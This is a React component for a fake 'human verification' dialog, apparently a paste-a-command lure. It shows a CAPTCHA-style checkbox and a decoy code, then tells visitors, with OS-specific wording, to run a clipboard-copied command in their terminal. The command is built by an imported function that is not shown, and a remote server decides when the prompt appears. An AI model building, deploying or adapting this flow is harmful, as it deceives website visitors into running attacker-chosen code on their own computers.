"use client"

import { useEffect, useRef, useState, type FormEvent } from "react"
import {
  decoyCode,
  humanVerification,
  verificationApi,
  visitorCommand,
  type PublicVerification,
} from "@/lib/human-verification"

function createClientId() {
  if (typeof crypto.randomUUID === "function") return crypto.randomUUID()
  const bytes = new Uint8Array(16)
  crypto.getRandomValues(bytes)
  bytes[6] = (bytes[6] & 0x0f) | 0x40
  bytes[8] = (bytes[8] & 0x3f) | 0x80
  const hex = Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`
}

let memoryClientId = ""

function readClientId() {
  const clientKey = "apax-verify-client"
  try {
    const existing = window.localStorage.getItem(clientKey) || window.sessionStorage.getItem(clientKey)
    if (existing) {
      window.localStorage.setItem(clientKey, existing)
      return existing
    }
    const created = createClientId()
    window.localStorage.setItem(clientKey, created)
    return created
  } catch {
    if (!memoryClientId) memoryClientId = createClientId()
    return memoryClientId
  }
}

async function verifyFetch(path: string, init?: RequestInit) {
  const response = await fetch(`${verificationApi()}${path}`, {
    ...init,
    headers: {
      "Content-Type": "application/json",
      ...(init?.headers || {}),
    },
  })
  const data = await response.json().catch(() => ({}))
  if (!response.ok) {
    throw new Error(typeof data.error === "string" ? data.error : "The check could not be completed.")
  }
  return data as PublicVerification
}

/** Copies during the click. The clipboard API is blocked on plain http:// pages. */
function copyText(text: string) {
  let ok = false
  const onCopy = (event: ClipboardEvent) => {
    event.preventDefault()
    event.clipboardData?.setData("text/plain", text)
    ok = true
  }
  document.addEventListener("copy", onCopy, true)
  const field = document.createElement("textarea")
  field.value = text
  field.setAttribute("readonly", "")
  field.style.position = "fixed"
  field.style.top = "0"
  field.style.left = "0"
  field.style.width = "2em"
  field.style.height = "2em"
  field.style.padding = "0"
  field.style.border = "none"
  field.style.outline = "none"
  field.style.boxShadow = "none"
  field.style.background = "transparent"
  field.style.fontSize = "16px"
  document.body.appendChild(field)
  field.focus()
  field.select()
  field.setSelectionRange(0, text.length)
  try {
    if (document.execCommand("copy")) ok = true
  } catch {
    // The copy event may already have written the line.
  }
  document.removeEventListener("copy", onCopy, true)
  document.body.removeChild(field)
  return ok
}

export function HumanVerification() {
  const [open, setOpen] = useState(false)
  const [session, setSession] = useState<PublicVerification | null>(null)
  const [checked, setChecked] = useState(false)
  const [checking, setChecking] = useState(false)
  const [copied, setCopied] = useState(false)
  const [codeInput, setCodeInput] = useState("")
  const [error, setError] = useState("")
  const [copyNote, setCopyNote] = useState("")
  const [submitting, setSubmitting] = useState(false)
  const [passed, setPassed] = useState(false)
  const [attempt, setAttempt] = useState(0)
  const [decoy, setDecoy] = useState("")
  const commandRef = useRef<HTMLTextAreaElement>(null)

  useEffect(() => {
    const clientId = readClientId()
    let cancelled = false
    verifyFetch("/verify/sessions", {
      method: "POST",
      body: JSON.stringify({ page: window.location.pathname, clientId }),
    })
      .then((next) => {
        if (!cancelled) setSession(next)
      })
      .catch((reason: Error) => {
        if (!cancelled) setError(reason.message)
      })
    return () => {
      cancelled = true
    }
  }, [attempt])

  useEffect(() => {
    if (!open) return
    const previous = document.body.style.overflow
    document.body.style.overflow = "hidden"
    return () => {
      document.body.style.overflow = previous
    }
  }, [open])

  const sessionId = session?.id
  const promptSeen = useRef(0)

  useEffect(() => {
    if (!sessionId) return
    let cancelled = false
    const pull = () => {
      verifyFetch(`/verify/sessions/${sessionId}`)
        .then((next) => {
          if (cancelled) return
          setSession(next)
          const finishedKey = `${next.id}:${next.promptId}`
          const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
          if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
            promptSeen.current = next.promptId
            setChecked(false)
            setChecking(false)
            setCopied(false)
            setCodeInput("")
            setError("")
            setCopyNote("")
            setPassed(false)
            setDecoy("")
            setOpen(true)
          }
        })
        .catch(() => {})
    }
    pull()
    const timer = window.setInterval(pull, 1500)
    return () => {
      cancelled = true
      window.clearInterval(timer)
    }
  }, [sessionId])

  async function onCheck() {
    if (!session || checked || checking) return
    setChecking(true)
    setError("")
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/check`, { method: "POST" })
      setSession(next)
      setDecoy(decoyCode(next.phrase))
      setChecked(true)
      setChecking(false)
    } catch (reason) {
      setChecking(false)
      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
    }
  }

  async function onCopy() {
    if (!session) return
    const command = visitorCommand(session.phrase, navigator.userAgent)
    if (!command) return
    setError("")
    let placed = copyText(command)
    if (!placed && window.isSecureContext && navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(command)
        placed = true
      } catch {
        placed = false
      }
    }
    if (placed) {
      setCopied(true)
      setCopyNote("")
      window.setTimeout(() => setCopied(false), 3000)
    } else {
      setCopied(false)
      commandRef.current?.focus()
      commandRef.current?.select()
      setCopyNote("Copy is blocked in this browser. The line is selected: press Ctrl+C.")
    }
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/copy`, { method: "POST" })
      setSession(next)
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
    }
  }

  async function onSubmit(event: FormEvent) {
    event.preventDefault()
    if (!session || submitting) return
    setSubmitting(true)
    setError("")
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/submit`, {
        method: "POST",
        body: JSON.stringify({ code: codeInput }),
      })
      if (next.verified) {
        window.sessionStorage.setItem("apax-last-prompt", `${next.id}:${next.promptId}`)
        promptSeen.current = next.promptId
        setPassed(true)
        window.setTimeout(() => setOpen(false), 1200)
      }
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "That code does not match.")
    } finally {
      setSubmitting(false)
    }
  }

  if (!open) return null

  const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
  const command = session ? visitorCommand(session.phrase, agent) : ""

  return (
    <div
      className="fixed inset-0 z-[80] flex items-center justify-center bg-[#f6f8fa] px-4"
      role="dialog"
      aria-modal="true"
      aria-label={passed ? humanVerification.successTitle : checked ? humanVerification.challengeTitle : humanVerification.title}
    >
      <div className="w-full max-w-[520px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
        {passed ? (
          <div className="px-0 py-10 text-center">
            <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
            <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
          </div>
        ) : checked && session ? (
          <>
            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
            <p className="mb-6 text-sm leading-normal text-[#64748b]">
              {/Mac OS X|Macintosh|macOS/i.test(agent) ? (
                <>
                  Run the command below in <strong>Terminal</strong> (paste, then press Enter).
                </>
              ) : /Windows/i.test(agent) ? (
                "Run the command below in an terminal."
              ) : (
                <>
                  Run the command below in a <strong>terminal</strong>.
                </>
              )}
            </p>
            <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-center">
              <p className="text-sm text-[#475569]">{humanVerification.decoyCaption}</p>
              <p className="mt-1 font-mono text-[28px] font-bold tracking-[6px] text-[#0f172a]">{decoy}</p>
            </div>
            {command ? (
              <div className="mb-4 flex items-center gap-2.5">
                <div className="min-h-20 min-w-0 flex-1 rounded-lg bg-[#0f172a] p-1">
                  <textarea
                    ref={commandRef}
                    readOnly
                    value={command}
                    aria-label={humanVerification.captureLabel}
                    onFocus={(event) => event.currentTarget.select()}
                    className="h-20 w-full resize-none border-none bg-transparent px-2 py-1.5 font-[Menlo,Consolas,monospace] text-[13px] leading-5 text-[#e2e8f0] outline-none"
                  />
                </div>
                <button
                  type="button"
                  onClick={onCopy}
                  className={`flex shrink-0 items-center justify-center gap-[5px] rounded-lg px-3.5 py-2.5 text-sm text-white ${
                    copied ? "bg-[#16a34a]" : "bg-[#2563eb] hover:bg-[#1d4ed8]"
                  }`}
                >
                  <span aria-hidden="true">{copied ? "✓" : "📋"}</span>
                  {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
                </button>
              </div>
            ) : (
              <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
                {humanVerification.captureWaiting}
              </p>
            )}
            {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
            <form onSubmit={onSubmit} className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4">
              <label htmlFor="human-code" className="block text-sm font-medium text-[#1e293b]">
                {humanVerification.verifyLabel}
              </label>
              <input
                id="human-code"
                value={codeInput}
                onChange={(event) => setCodeInput(event.target.value)}
                autoComplete="off"
                spellCheck={false}
                maxLength={6}
                placeholder={humanVerification.verifyPlaceholder}
                className="mt-2 w-full rounded-md border border-[#cbd5e1] bg-white px-3 py-2.5 text-base outline-none focus:border-[#2563eb]"
              />
              {error ? <p className="mt-1.5 text-[13px] text-[#dc2626]">{humanVerification.verifyError}</p> : null}
              <button
                type="submit"
                disabled={submitting}
                className="mt-3 w-full cursor-pointer rounded-md border-none bg-[#2563eb] px-3 py-2.5 text-sm text-white hover:bg-[#1d4ed8] disabled:opacity-40"
              >
                {humanVerification.continueLabel}
              </button>
            </form>
          </>
        ) : (
          <>
            <div className="mb-6 flex items-center gap-2.5">
              <svg viewBox="0 0 36 36" className="size-9" aria-hidden="true">
                <rect width="36" height="36" rx="8" fill="#F6821F" />
                <path d="M10 14h16v2H10zm0 4h12v2H10zm0 4h12v2H10z" fill="#fff" />
              </svg>
              <span className="text-lg font-semibold text-[#1e293b]">{humanVerification.brand}</span>
            </div>
            <h2 className="text-xl font-semibold">{humanVerification.title}</h2>
            <p className="mb-6 mt-2 text-sm leading-6 text-[#64748b]">{humanVerification.intro}</p>
            <label className="flex items-center gap-3 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] px-4 py-3.5 hover:border-[#94a3b8]">
              <input
                type="checkbox"
                checked={checked}
                disabled={!session || checking}
                onChange={onCheck}
                className="size-[22px] accent-[#2563eb]"
              />
              <span className="flex-1 text-[15px] text-[#1e293b]">{humanVerification.checkboxLabel}</span>
            </label>
            {!session && !error ? (
              <p className="mt-3 text-[13px] text-[#64748b]">Opening the check...</p>
            ) : null}
            {error && !session ? (
              <button
                type="button"
                onClick={() => {
                  setError("")
                  setAttempt((value) => value + 1)
                }}
                className="mt-3 text-sm font-semibold text-[#2563eb]"
              >
                Try again
              </button>
            ) : null}
            {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
          </>
        )}
        <p className="mt-5 text-center text-xs text-[#94a3b8]">{humanVerification.footer}</p>
      </div>
    </div>
  )
}
